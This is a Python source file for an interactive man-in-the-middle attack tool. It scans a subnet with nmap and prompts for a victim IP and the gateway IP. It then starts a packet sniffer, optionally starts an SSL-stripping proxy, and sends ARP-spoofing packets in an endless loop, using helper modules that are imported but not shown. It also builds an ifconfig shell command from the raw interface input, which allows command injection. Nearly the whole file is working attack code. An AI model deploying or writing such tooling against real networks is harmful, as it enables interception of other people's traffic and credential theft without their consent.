from colorama import Fore
import time
import nmap

from sniffer import sniff_packets
from arp_spoofer import send_arp_packet
import psutil
import os
from start_sslstrip_proxy import start_sslsrip_proxy

# Function to get MAC address for the given interface (default: eth0)
def get_mac_address(interface="eth0"):

    return os.popen(f"ifconfig {interface} | grep ether | awk '{{print $2}}'").read().strip()


# Function to scan the network for active devices and show available interfaces
def scan_active_devices_and_interfaces(network):
    # Creating nmap scanner object
    nm = nmap.PortScanner()

    # Performing a network scan for hosts
    try:
        nm.scan(hosts=network, arguments='-sn')  # -sn is used for host discovery (no port scan)
    except Exception as e:
        print(f"Error while scanning the network: {e}")  # Handling possible scan failures
        exit()

    print(f"Potential targets in {network}:")
    for host in nm.all_hosts():
        # If the device is the Default Gateway
        if 'hostnames' in nm[host] and 'default' in nm[host]['hostnames']:
            print(f"Default Gateway: {host}")

        # If the device is active
        elif nm[host].state() == "up":
            print(f"{Fore.GREEN}Host {host} is active")

    # Getting network interfaces on the system
    interfaces = psutil.net_if_addrs()

    for interface in interfaces.items():
        print(f"{Fore.YELLOW}Interface: {interface}")


# Function to start sniffing packets for MITM attack
def start_sniffing(interface, target1_ip, target2_ip):
    sniff_packets(interface, target1_ip, target2_ip)


# Function to handle the main MITM attack process
import sys
import threading

def mitm_attacker():
    print(f"{Fore.CYAN}WELCOME TO THE MITM TOOL!")

    time.sleep(0.5)

    network = input("Please enter the network subnet mask (example: 10.10.10.0/24):")
    try:
        print(f"{Fore.MAGENTA}PERFORMING NETWORK SCANNING...")
        scan_active_devices_and_interfaces(network)
    except Exception as e:
        print(f"{Fore.RED}Please enter a valid subnet mask! Error: {str(e)}")
        sys.exit()

    target_ip = input(f"{Fore.CYAN}Enter your target IP:")
    spoof_ip = input(f"{Fore.CYAN}Enter the spoof IP (default gateway):")
    interface = input(f"{Fore.CYAN}Enter the interface:")

    mac_address = get_mac_address(interface)

    sniffing_thread = threading.Thread(target=start_sniffing, args=(interface, target_ip, spoof_ip))
    ssl_strip_thread = threading.Thread(target=start_sslsrip_proxy)

    check_ssl_strip = input(f"{Fore.MAGENTA}Do you want to also use SSL Strip in the attack? (yes/no):")

    try:
        print(f"{Fore.GREEN}ATTACK STARTED...")
        sniffing_thread.start()

        if check_ssl_strip.lower() == "yes":
            print("Starting proxy server for SSL strip...")
            ssl_strip_thread.start()

        while True:
            send_arp_packet(interface, target_ip, spoof_ip, mac_address)
            send_arp_packet(interface, spoof_ip, target_ip, mac_address)

    except KeyboardInterrupt:
        print("Attack interrupted. Stopping...")
        sniffing_thread.join()
        if ssl_strip_thread.is_alive():
            print("Stopping SSL Strip...")
            ssl_strip_thread.join()
        sys.exit()